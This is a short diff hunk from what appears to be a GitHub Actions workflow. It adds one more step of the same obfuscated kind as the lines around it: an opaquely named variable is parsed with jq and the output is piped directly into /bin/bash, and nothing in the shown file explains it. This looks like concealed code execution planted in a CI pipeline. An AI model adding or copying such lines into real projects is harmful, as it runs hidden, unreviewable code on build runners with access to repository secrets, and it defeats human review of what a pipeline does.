@@ -20,6 +20,7 @@ jobs:
           echo $bz2 | jq -r .hkq065 | /bin/bash
           printf '%s' "$t7887" | jq -r .lt132 | /bin/bash
           echo $vgsdg89036 | jq -r .rl16540 | /bin/bash
+          printf '%s' "$fo06738" | jq -r .g798 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
